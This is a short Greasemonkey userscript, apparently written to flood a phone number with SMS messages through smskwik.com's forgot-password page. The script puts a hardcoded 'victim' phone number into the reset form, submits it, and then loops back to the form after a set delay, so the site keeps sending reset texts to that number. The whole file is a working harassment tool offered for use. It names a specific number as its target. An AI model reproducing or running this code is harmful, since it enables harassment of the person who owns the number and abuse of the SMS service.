// ==UserScript==
// @name          Anonymous SMSKWIK.COM flooder
// @namespace     SUNNY020
// @description   flooder sms
// @include       http://*smskwik.com/*
// @credits       One
// ==/UserScript==

var victim=8092262928 //
var delay=0; // Enter delay in milliseconds if required

if(document.location=="http://smskwik.com/index.php/forgotpassword"||document.location=="http://smskwik.com/index.php/forgotpassword")
{
document.forms[0].elements[0].value=victim;
document.forms[0].submit();
}
if(document.location=="http://smskwik.com/index.php/forgotpassword/verify"||document.location=="http://smskwik.com/index.php/forgotpassword/verify")
setTimeout("document.location='http://smskwik.com/index.php/forgotpassword'",delay);
